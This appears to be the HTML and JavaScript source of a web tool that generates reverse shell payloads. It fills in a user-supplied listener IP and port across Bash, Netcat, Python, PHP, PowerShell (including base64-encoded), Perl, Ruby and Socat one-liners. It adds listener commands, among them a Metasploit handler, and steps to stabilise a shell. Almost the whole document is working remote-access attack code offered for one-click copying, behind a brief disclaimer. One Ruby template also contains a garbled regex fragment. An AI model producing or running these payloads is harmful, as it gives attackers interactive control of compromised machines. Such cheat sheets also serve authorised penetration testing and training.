<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reverse Shell Generator</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg: #0a0a0a;
            --surface: #111111;
            --surface-2: #1a1a1a;
            --border: #2a2a2a;
            --green: #00ff41;
            --green-dim: #00cc33;
            --red: #ff0040;
            --purple: #7c3aed;
            --cyan: #00d4ff;
            --text: #e0e0e0;
            --text-dim: #888;
            --glow: 0 0 20px rgba(0, 255, 65, 0.15);
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Matrix rain background */
        .matrix-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            opacity: 0.03;
            pointer-events: none;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 255, 65, 0.03) 2px,
                rgba(0, 255, 65, 0.03) 4px
            );
        }

        .container {
            max-width: 960px;
            margin: 0 auto;
            padding: 30px 20px;
            position: relative;
            z-index: 1;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.05), rgba(124, 58, 237, 0.05));
            border: 1px solid var(--border);
            border-radius: 16px;
        }

        .header h1 {
            font-family: 'Fira Code', monospace;
            font-size: 2rem;
            color: var(--green);
            text-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
            margin-bottom: 8px;
        }

        .header h1 span { color: var(--red); }

        .header p {
            color: var(--text-dim);
            font-size: 0.9rem;
        }

        .disclaimer {
            background: rgba(255, 0, 64, 0.08);
            border: 1px solid rgba(255, 0, 64, 0.2);
            border-radius: 8px;
            padding: 10px 16px;
            margin-top: 16px;
            font-size: 0.75rem;
            color: var(--red);
            font-family: 'Fira Code', monospace;
        }

        /* Config Section */
        .config {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 30px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .input-group label {
            font-family: 'Fira Code', monospace;
            font-size: 0.75rem;
            color: var(--green);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group input, .input-group select {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--text);
            font-family: 'Fira Code', monospace;
            font-size: 0.9rem;
            outline: none;
            transition: all 0.3s;
        }

        .input-group input:focus, .input-group select:focus {
            border-color: var(--green);
            box-shadow: var(--glow);
        }

        .input-group select { cursor: pointer; }
        .input-group select option { background: var(--surface); }

        /* Shell Cards */
        .shells-grid {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .shell-card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s;
        }

        .shell-card:hover {
            border-color: var(--green-dim);
            box-shadow: var(--glow);
        }

        .shell-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 20px;
            background: var(--surface-2);
            border-bottom: 1px solid var(--border);
        }

        .shell-title {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .shell-lang {
            font-family: 'Fira Code', monospace;
            font-weight: 600;
            font-size: 0.9rem;
            color: var(--green);
        }

        .shell-badge {
            font-size: 0.65rem;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Fira Code', monospace;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .badge-tcp { background: rgba(0, 255, 65, 0.1); color: var(--green); border: 1px solid rgba(0, 255, 65, 0.2); }
        .badge-web { background: rgba(124, 58, 237, 0.1); color: var(--purple); border: 1px solid rgba(124, 58, 237, 0.2); }
        .badge-win { background: rgba(0, 212, 255, 0.1); color: var(--cyan); border: 1px solid rgba(0, 212, 255, 0.2); }

        .copy-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--text-dim);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-family: 'Fira Code', monospace;
            font-size: 0.75rem;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .copy-btn:hover { border-color: var(--green); color: var(--green); }

        .copy-btn.copied {
            border-color: var(--green);
            color: var(--green);
            background: rgba(0, 255, 65, 0.1);
        }

        .shell-code {
            padding: 16px 20px;
            font-family: 'Fira Code', monospace;
            font-size: 0.82rem;
            line-height: 1.6;
            color: #c9d1d9;
            white-space: pre-wrap;
            word-break: break-all;
            overflow-x: auto;
        }

        .shell-code .highlight-ip { color: var(--red); font-weight: 600; }
        .shell-code .highlight-port { color: var(--cyan); font-weight: 600; }

        /* Category Headers */
        .category {
            margin-top: 24px;
            margin-bottom: 12px;
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
        }

        .category h2 {
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .category h2 span { color: var(--green); }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: var(--text-dim);
            font-size: 0.8rem;
            border-top: 1px solid var(--border);
        }

        .footer a {
            color: var(--green);
            text-decoration: none;
        }

        /* Responsive */
        @media (max-width: 640px) {
            .config { grid-template-columns: 1fr; }
            .header h1 { font-size: 1.4rem; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="header">
            <h1>$ reverse<span>_</span>shell<span>.</span>gen</h1>
            <p>Generate reverse shell payloads instantly. One-click copy. Zero install.</p>
            <div class="disclaimer">
                &#9888; For authorized penetration testing and educational purposes only.
            </div>
        </div>

        <div class="config">
            <div class="input-group">
                <label>&#9654; Listener IP</label>
                <input type="text" id="ip" value="10.10.14.1" placeholder="Your IP address">
            </div>
            <div class="input-group">
                <label>&#9654; Listener Port</label>
                <input type="number" id="port" value="4444" placeholder="Port number">
            </div>
            <div class="input-group">
                <label>&#9654; Shell Type</label>
                <select id="shellType">
                    <option value="/bin/sh">/bin/sh</option>
                    <option value="/bin/bash" selected>/bin/bash</option>
                    <option value="/bin/zsh">/bin/zsh</option>
                    <option value="cmd.exe">cmd.exe</option>
                    <option value="powershell">powershell</option>
                </select>
            </div>
            <div class="input-group">
                <label>&#9654; Encoding</label>
                <select id="encoding">
                    <option value="none" selected>None</option>
                    <option value="base64">Base64</option>
                    <option value="url">URL Encode</option>
                </select>
            </div>
        </div>

        <div class="shells-grid" id="shellsContainer"></div>

        <div class="footer">
            Built with &#9760; by <a href="https://github.com/geevarghesekthomas84-sys" target="_blank">Gg</a>
            &nbsp;|&nbsp; <a href="https://github.com/geevarghesekthomas84-sys/reverse-shell-generator" target="_blank">Star on GitHub</a>
        </div>
    </div>

    <script>
        const shells = [
            {
                category: "Linux / Unix",
                items: [
                    {
                        name: "Bash -i",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`
                    },
                    {
                        name: "Bash Read Line",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&1 | tee >(cat >&5); done`
                    },
                    {
                        name: "Bash 196",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${shell} <&196 >&196 2>&196`
                    },
                    {
                        name: "Bash UDP",
                        badge: "tcp", badgeText: "UDP",
                        template: (ip, port, shell) => `${shell} -i >& /dev/udp/${ip}/${port} 0>&1`
                    }
                ]
            },
            {
                category: "Netcat",
                items: [
                    {
                        name: "Netcat -e",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `nc ${ip} ${port} -e ${shell}`
                    },
                    {
                        name: "Netcat -c",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `nc -c ${shell} ${ip} ${port}`
                    },
                    {
                        name: "Netcat FIFO",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`
                    },
                    {
                        name: "Ncat (SSL)",
                        badge: "tcp", badgeText: "SSL",
                        template: (ip, port, shell) => `ncat --ssl ${ip} ${port} -e ${shell}`
                    }
                ]
            },
            {
                category: "Python",
                items: [
                    {
                        name: "Python3 Short",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])'`
                    },
                    {
                        name: "Python3 PTY",
                        badge: "tcp", badgeText: "PTY",
                        template: (ip, port, shell) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${shell}")'`
                    },
                    {
                        name: "Python3 Spawn",
                        badge: "tcp", badgeText: "SPAWN",
                        template: (ip, port, shell) => `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`
                    }
                ]
            },
            {
                category: "PHP",
                items: [
                    {
                        name: "PHP exec",
                        badge: "web", badgeText: "WEB",
                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`
                    },
                    {
                        name: "PHP proc_open",
                        badge: "web", badgeText: "WEB",
                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${shell}",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`
                    },
                    {
                        name: "PHP popen",
                        badge: "web", badgeText: "WEB",
                        template: (ip, port, shell) => `php -r '$sock=fsockopen("${ip}",${port});popen("${shell} <&3 >&3 2>&3","r");'`
                    }
                ]
            },
            {
                category: "PowerShell (Windows)",
                items: [
                    {
                        name: "PowerShell #1",
                        badge: "win", badgeText: "WIN",
                        template: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
                    },
                    {
                        name: "PowerShell #2",
                        badge: "win", badgeText: "WIN",
                        template: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$snb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$client.Close()"`
                    },
                    {
                        name: "PowerShell Base64",
                        badge: "win", badgeText: "B64",
                        template: (ip, port) => {
                            const cmd = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                            return `powershell -e ${btoa(cmd)}`;
                        }
                    }
                ]
            },
            {
                category: "Perl",
                items: [
                    {
                        name: "Perl",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`
                    },
                    {
                        name: "Perl no sh",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
                    }
                ]
            },
            {
                category: "Ruby",
                items: [
                    {
                        name: "Ruby",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port, shell) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`
                    },
                    {
                        name: "Ruby no sh",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444 cd\\s+(.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$!}"}'`
                    }
                ]
            },
            {
                category: "Socat",
                items: [
                    {
                        name: "Socat #1",
                        badge: "tcp", badgeText: "TCP",
                        template: (ip, port) => `socat TCP:${ip}:${port} EXEC:${document.getElementById('shellType').value},pty,stderr,setsid,sigint,sane`
                    },
                    {
                        name: "Socat Listener",
                        badge: "tcp", badgeText: "LISTEN",
                        template: (ip, port) => `# Run on YOUR machine:\nsocat file:\`tty\`,raw,echo=0 TCP-L:${port}`
                    }
                ]
            },
            {
                category: "Listeners (Run on YOUR machine)",
                items: [
                    {
                        name: "Netcat Listener",
                        badge: "tcp", badgeText: "LISTEN",
                        template: (ip, port) => `nc -lvnp ${port}`
                    },
                    {
                        name: "rlwrap Listener",
                        badge: "tcp", badgeText: "LISTEN",
                        template: (ip, port) => `rlwrap nc -lvnp ${port}`
                    },
                    {
                        name: "Pwncat Listener",
                        badge: "tcp", badgeText: "LISTEN",
                        template: (ip, port) => `pwncat-cs -lp ${port}`
                    },
                    {
                        name: "Metasploit Listener",
                        badge: "tcp", badgeText: "MSF",
                        template: (ip, port) => `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`
                    }
                ]
            },
            {
                category: "Upgrade to Interactive Shell",
                items: [
                    {
                        name: "Stabilize with Python",
                        badge: "tcp", badgeText: "PTY",
                        template: () => `python3 -c 'import pty;pty.spawn("/bin/bash")'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm`
                    },
                    {
                        name: "Stabilize with script",
                        badge: "tcp", badgeText: "PTY",
                        template: () => `script -qc /bin/bash /dev/null\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm`
                    }
                ]
            }
        ];

        function getValues() {
            return {
                ip: document.getElementById('ip').value || '10.10.14.1',
                port: document.getElementById('port').value || '4444',
                shell: document.getElementById('shellType').value,
                encoding: document.getElementById('encoding').value
            };
        }

        function encodePayload(payload, encoding) {
            if (encoding === 'base64') {
                try { return btoa(payload); } catch(e) { return payload; }
            }
            if (encoding === 'url') return encodeURIComponent(payload);
            return payload;
        }

        function highlightCode(code, ip, port) {
            code = code.replace(new RegExp(ip.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), 
                `<span class="highlight-ip">${ip}</span>`);
            code = code.replace(new RegExp(`\\b${port}\\b`, 'g'), 
                `<span class="highlight-port">${port}</span>`);
            return code;
        }

        function copyToClipboard(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                const orig = btn.innerHTML;
                btn.innerHTML = '&#10003; Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.innerHTML = orig;
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        function render() {
            const { ip, port, shell, encoding } = getValues();
            const container = document.getElementById('shellsContainer');
            container.innerHTML = '';

            shells.forEach(category => {
                const catDiv = document.createElement('div');
                catDiv.className = 'category';
                catDiv.innerHTML = `<h2><span>//</span> ${category.category}</h2>`;
                container.appendChild(catDiv);

                category.items.forEach(item => {
                    let raw = item.template(ip, port, shell);
                    let payload = encodePayload(raw, encoding);
                    
                    const card = document.createElement('div');
                    card.className = 'shell-card';
                    card.innerHTML = `
                        <div class="shell-header">
                            <div class="shell-title">
                                <span class="shell-lang">${item.name}</span>
                                <span class="shell-badge badge-${item.badge}">${item.badgeText}</span>
                            </div>
                            <button class="copy-btn" onclick="copyToClipboard(\`${payload.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`, this)">
                                &#9112; Copy
                            </button>
                        </div>
                        <div class="shell-code">${highlightCode(payload, ip, port)}</div>
                    `;
                    container.appendChild(card);
                });
            });
        }

        // Re-render on input change
        document.getElementById('ip').addEventListener('input', render);
        document.getElementById('port').addEventListener('input', render);
        document.getElementById('shellType').addEventListener('change', render);
        document.getElementById('encoding').addEventListener('change', render);

        // Initial render
        render();
    </script>
</body>
</html>
